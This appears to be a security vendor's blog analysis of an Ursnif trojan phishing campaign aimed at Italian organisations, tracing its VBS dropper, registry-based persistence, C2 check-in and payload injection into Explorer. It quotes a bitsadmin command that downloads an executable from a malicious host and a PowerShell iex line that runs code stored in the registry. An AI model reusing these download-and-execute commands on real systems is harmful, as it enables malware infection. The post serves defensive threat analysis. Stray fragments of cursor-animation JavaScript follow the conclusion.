<h2 class="wp-block-heading">Introduction</h2>



<p>The Ursnif trojan confirms itself as one of the most active malware threats in cyberspace, even during the past days, when new attack attempts reached several organization across Italy. Cybaze-Yoroi ZLab teams dissected its infection chain to keep tracking the evolution of this persistent malware threat, analyzing its multiple stages, each one with the purpose to evade detection, sometimes leveraging system tools to achieve its final objective: run the Ursnif payload.</p>



<div class="wp-block-image"><figure class="aligncenter"><img decoding="async" src="https://lh4.googleusercontent.com/dARcfUDtXXLscG56A3Kebe5KQLLR2uD7n0aFzN9cttZMmAPPEWvS_kHGX46tSrDe7ZglM7Hwkh60oGCMExqTx-jAf5Eg8QabEQBtCjPHD-N_UKOLEvaorOjmfCjcpmvsjgGoqqU" alt=""/><figcaption>Figure 1: Infection chain of Ursnif malware</figcaption></figure></div>



<h2 class="wp-block-heading">Technical Analysis</h2>



<p>Unlike previous waves, this one does not leverage steganography or heavily obfuscated powershell payloads. Instead, it abuses a VB script hidden into a compressed archive embedded within an innocent looking email referencing a summon. When users click on Decreto hyperlink, they are redirected to a Google Drive web page which opens a fake page where a fake document is shown and it invites them to click on a download link</p>



<div class="wp-block-image"><figure class="aligncenter"><img decoding="async" src="https://lh6.googleusercontent.com/lwvsrANf-4Ji2lScNDnasVZMu8iGyHV788StAdB3NXI_Angf-COlkN6eKp3lLxdsgE_rmyOqFEddE5EHW9eZotbqDB-aisvER0-juNJkPLmNXW3CElqSCcG-pwlzfvbP3F609CE" alt=""/><figcaption>Figure 2: Drive document Scarica il documento</figcaption></figure></div>



<p>Once clicked on the Scarica il documento link into the Drive document, an archive is downloaded on the victim machine from blogger[.]scentasticyoga[.]com, embedding two different files: the first is an obfuscated Visual Basic Script (VBS) and the second one is a legit image placed there to deceive the victim. <br></p>



<div class="wp-block-image"><figure class="aligncenter"><img decoding="async" src="https://lh5.googleusercontent.com/RSF7_sOwlc0EWFhVxJ95WyGqEPamqqERx9_ID1Wt5HA0TDtOg01gfBqw3bp2AWSWiPhy1WsRxqRchB1w5QM8Q-dFrqGErrgxtWAkkjGUx4EhanhisL0t7Cr3d7j-C66l_owMFRc" alt=""/><figcaption>Figure 3: File contained in the Zip file<br></figcaption></figure></div>



<p>The VBS code is obfuscated to evade antivirus detection and, in order to confuse the analyst, all the values are manipulated in different steps: using many mathematical operations, very long random variable names and other content encoded in Base64 format. The malicious routine is split in many slices and then recombined at runtime, quite basic but it is effective evasion technique. After a first de-obfuscation phase, a more readable code could be obtained.</p>



<div class="wp-block-image"><figure class="aligncenter"><img loading="lazy" decoding="async" width="1077" height="436" src="https://i1.wp.com/blog.yoroi.company/wp-content/uploads/2019/03/Screenshot_2019-03-25_160421.png?fit=640%2C259&amp;ssl=1" alt="" class="wp-image-2922" srcset="https://yoroi.company/wp-content/uploads/2019/03/Screenshot_2019-03-25_160421.png 1077w, https://yoroi.company/wp-content/uploads/2019/03/Screenshot_2019-03-25_160421-300x121.png 300w, https://yoroi.company/wp-content/uploads/2019/03/Screenshot_2019-03-25_160421-1024x415.png 1024w, https://yoroi.company/wp-content/uploads/2019/03/Screenshot_2019-03-25_160421-768x311.png 768w" sizes="auto, (max-width: 1077px) 100vw, 1077px" /><figcaption>Figure 4: Malicious VBS, obfuscated (left) and de-obfuscated (right)</figcaption></figure></div>



<p>In the end, the infection starts and the malware runs cmd.exe to download the eyTWUDW.exe through the Bitsadmin utility,  and store it into "%APPDATA%\Local\Temp".<br></p>



<table class="wp-block-table"><tbody><tr><td>C:\Windows\System32\cmd.exe /c bitsadmin &nbsp;/transfer msd5 /priority foreground <a href="http://blog.practicereiki.com/pagpoftrh54.php" rel="nofollow">http://blog.practicereiki.com/pagpoftrh54.php</a> C:\Users\admin\AppData\Local\Temp/eyTWUDW.exe</td></tr></tbody></table>



<p>The Bitsadmin utility is legit Microsoft command line tool typically used by sysadmins to download system updates, but during the last years it has also been abused by cyber criminals to masquerade malicious network activities. In this case it has been leveraged to manage the download of the next component of the infection chain from  hxxp://blog[.practicereiki[.com/pagpoftrh54[.php.<br></p>



<div class="wp-block-image"><figure class="alignright"><img decoding="async" src="https://lh3.googleusercontent.com/JUKqPSTgiayG8ulP3r6ywx7AbQjeb-0gnyi4Q0G0uXtWY4UI4vkWAnrIVhwhJN-z4uIk9NJ3jrXIfxSUsDMYLCN5htwQj-QrwSXdYbSVcnYrambEk_BP5Kp8wO9VpM2QmB7eTvM" alt=""/></figure></div>



<p>After that, the loader runs  schtasks to enable the execution of the eyTWUDW.exe payload temporary stored in %APPDATA%\Local\Temp, and then downloads the next malware stage from<br></p>



<table class="wp-block-table"><tbody><tr><td>http[://link[.kunstsignal[.net/images/W534K5hp8zGWYvpMJkayjGf/FqWxvwp_2F/1_2BEPHtH1r_2FpG5 /o0BuA8sr5LGg /IDwj8Q6mCoq/5nK9XEb3WoD5wW/y8lJVn5t5QXZMUgDQopzF /oO58ImaZl53M5X3E/whzGq3GIOtuCnK6/o3R_2BwMMv/wAo5qeqZ/a[.avi</td></tr></tbody></table>



<p>Through the mentioned URL, it was possible to intercept the downloaded encrypted payload, sub-sequentially digested by the eyTWUDW.exe process which, after an internal decryption phase, stores it into a registry key, establishing a file-less persistence on the target machine. <br></p>



<figure class="wp-block-image"><img decoding="async" src="https://lh6.googleusercontent.com/yaWsfQGWObaEUc4bCjSNeEwHdnkWL3wC2XQdvNNnl-oL5SjGUAQJ1S3NIQGsv9qiWitts_hmE7HH-UkiSOJolsWhVau4Ey8AqWOR4nOq5DKCLtqID8HeCINTSmqL3elOVtOjjys" alt=""/><figcaption>Figure 5: Registry key set by malware</figcaption></figure>



<p>Moreover, the malware contacts another time the C2 to confirm the successful infection, sending a check-in HTTP request containing parameters used to identify the malware implant:<br></p>



<table class="wp-block-table"><tbody><tr><td><strong>Parameter</strong></td><td><strong>Value</strong></td><td><strong>Description</strong></td></tr><tr><td>soft</td><td>3</td><td>Major release</td></tr><tr><td>version</td><td>214071</td><td>Malware software version</td></tr><tr><td>user</td><td>b2861874feedbf530d08c77a9d5833de</td><td>User id of the infected machine</td></tr><tr><td>server</td><td>12</td><td>Server ID</td></tr><tr><td>id</td><td>822</td><td>Synthetic id of infected machine</td></tr><tr><td>crc</td><td>1</td><td>checksum</td></tr><tr><td>uptime</td><td>235</td><td>Time of infection start</td></tr></tbody></table>



<div class="wp-block-image"><figure class="alignright"><img decoding="async" src="https://lh5.googleusercontent.com/WulG23gMnstpDdxj6Tidi5nOVC9UiPsoeEoSe1ZAmc180CGBAsl7ZPQL0tcqyPqirUQwdNPzr8-OPjNYMoGs9HDYjvpqvGhuLivooFyvn-o-uuuwVTKtJinHr6_mKpAscqBUnOw" alt=""/></figure></div>



<p style="text-align:center">Table 1: Ursnif infection format<br></p>



<p>Investigating the remote destination where the C2 is hosted, it results active since 05 March 2019, just a few times before the attack wave; destination unknown to many AV Vendors at time of attack, suggesting this portion of the infrastructure has been specifically prepared for the Italian landscape.<br></p>



<p>At this point, <em>eyTWUDW.exe</em> runs the previously stored script through the following command, invoking Powershell code from the registry sub-key <em>amxrters</em>.<br></p>



<table class="wp-block-table"><tbody><tr><td>powershell &nbsp;iex([System.Text.Encoding]::ASCII.GetString((Get-ItemProperty 'HKCU:\Software\AppDataLow\Software\Microsoft\94502524-E302-E68A-0D08-C77A91BCEB4E').amxrters))</td></tr></tbody></table>



<p>The content of this additional script is obfuscated with layers of Base-64 encoding, arrays of integers and char-code to byte conversions. Dissecting the script we obtained a more readable code:<br></p>



<figure class="wp-block-image"><img loading="lazy" decoding="async" width="1046" height="443" src="https://i1.wp.com/blog.yoroi.company/wp-content/uploads/2019/03/Screenshot_2019-03-25_163131.png?fit=640%2C271&amp;ssl=1" alt="" class="wp-image-2924" srcset="https://yoroi.company/wp-content/uploads/2019/03/Screenshot_2019-03-25_163131.png 1046w, https://yoroi.company/wp-content/uploads/2019/03/Screenshot_2019-03-25_163131-300x127.png 300w, https://yoroi.company/wp-content/uploads/2019/03/Screenshot_2019-03-25_163131-1024x434.png 1024w, https://yoroi.company/wp-content/uploads/2019/03/Screenshot_2019-03-25_163131-768x325.png 768w" sizes="auto, (max-width: 1046px) 100vw, 1046px" /><figcaption>Figure 6: Script extracted from registry key (left Obfuscated, right Deobfuscated)</figcaption></figure>



<p>The first part contains dependencies loaded by the malware to interact with the OS, such as the classic kernel32 and, more interestingly, one of the last called functions reveal the usage of the same APC injection techniques observed in previous attack waves to inject the payload into the Explorer.exe process (rif. QueueUserAPC in <a href="https://blog.yoroi.company/research/dissecting-the-latest-ursnif-dhl-themed-campaign/">Dissecting the Latest Ursnif DHL themed Campaign</a>). The de-obfuscation of the central part of the script reveals the classical string <em>This program cannot be run in DOS mode</em>, part of the header of the final stage of the malware will be injected into the Explorer process.<br></p>



<div class="wp-block-image"><figure class="aligncenter"><img decoding="async" src="https://lh3.googleusercontent.com/fE7RA3ODsEqeq_J_dmStC3T9CE2ciDy1tPPcluuEbeX6hvcn8ZL9U7wBGEPZHrBS2dWetECSpuCTVLlr9j4LlMRHig2ydK78f_uhr8QxSzw4kVAN6JALK5eWJ1VjWDtWPonho8A" alt=""/><figcaption>Figure 7: Ursnif final payload extracted from script</figcaption></figure></div>



<p>After noticing the payload is very similar to another Ursnif sample yet analyzed in <a href="https://blog.yoroi.company/research/ursnif-long-live-the-steganography/">Ursnif Long Live the Steganography</a>, we proceeded with a differential analysis to spot eventual variations between the samples. <br></p>



<figure class="wp-block-image"><img decoding="async" src="https://lh3.googleusercontent.com/azR3KWc91FCb-6uILkg-fRm41nMS9GjL_r3llMDGVQ5Y8-Y4fkDJP-lVmDoU-WB6O9p8LtTxIu9CjP25kwLfEZyd9gcURTy8aYKxb3gu-ylr0BuoGUnRqi14-5e6-Tv3FrUbd-k" alt=""/><figcaption>Figure 8: Diff. analysis between already analyzed sample (1)</figcaption></figure>



<p>At first look, there are many common parts between the samples, for instance both files are compiled in 64 bit mode and the value in the PE sections are closely similar. However, the compilation time were different: while the older is the 28th January, the newer one is 11 March, almost a week after the comparison on the internet of the command and control server host 46.8.18[.186 (CONTEL-NET-3 RU).<br></p>



<div class="wp-block-image"><figure class="aligncenter"><img decoding="async" src="https://lh5.googleusercontent.com/x5hz032iFW3m9gL0esY4H2-OKCtQo8RabrKdNyDJixP_Q2ayMFWh8pTF8AOaDj4sjQOGCUgeMAL4paR7n0U7u0aJvLm3p8UEcHumEknSeDLYfsfVAxt_3Z8IovISuTU2_Fe_FJI" alt=""/><figcaption>Figure 9: Diff. analysis between already analyzed sample (2)</figcaption></figure></div>



<h2 class="wp-block-heading">Conclusion </h2>



<p>Ursnif confirms itself as one of the most active and aggressive malware threats spreading both worldwide and within the Italian cyber-landscape. Threat actors behind these attacks constantly update and vary their infection chains to avoid security controls and evade antivirus detection, luring users with context sounding email messages being opened by thousands of victims each attack wave. A serious threat for the security of users data and company assets. </p>

    setupEventListeners: function() {
        var self = this;
        
        // Anchor hovering
        document.querySelectorAll('a, #image-118-8, .button').forEach(function(el) {
            el.addEventListener('mouseover', function() {
                self.cursorEnlarged = true;
                self.toggleCursorSize();
            });
            el.addEventListener('mouseout', function() {
                self.cursorEnlarged = false;
                self.toggleCursorSize();
            });
        });
        
        // Click events
        document.addEventListener('mousedown', function() {
            self.cursorEnlarged = true;
            self.toggleCursorSize();
        });
        document.addEventListener('mouseup', function() {
            self.cursorEnlarged = false;
            self.toggleCursorSize();
        });
  
  
        document.addEventListener('mousemove', function(e) {
            // Show the cursor
            self.cursorVisible = true;
            self.toggleCursorVisibility();

            // Position the dot
            self.endX = e.pageX;
            self.endY = e.pageY;
            self.$dot.style.top = self.endY + 'px';
            self.$dot.style.left = self.endX + 'px';
        });
        
        // Hide/show cursor
        document.addEventListener('mouseenter', function(e) {
            self.cursorVisible = true;
            self.toggleCursorVisibility();
            self.$dot.style.opacity = 1;
            self.$outline.style.opacity = 1;
        });
        
        document.addEventListener('mouseleave', function(e) {
            self.cursorVisible = true;
            self.toggleCursorVisibility();
            self.$dot.style.opacity = 0;
            self.$outline.style.opacity = 0;
        });
    },
    
    animateDotOutline: function() {
        var self = this;
        
        self._x += (self.endX - self._x) / self.delay;
        self._y += (self.endY - self._y) / self.delay;
        self.$outline.style.top = self._y + 'px';
        self.$outline.style.left = self._x + 'px';
        
        requestAnimationFrame(this.animateDotOutline.bind(self));
    },

        } else {
            self.$dot.style.transform = 'translate(-50%, -50%) scale(1)';
            self.$outline.style.transform = 'translate(-50%, -50%) scale(1)';
        }
    },

        var self = this;

            self.$outline.style.opacity = 1;
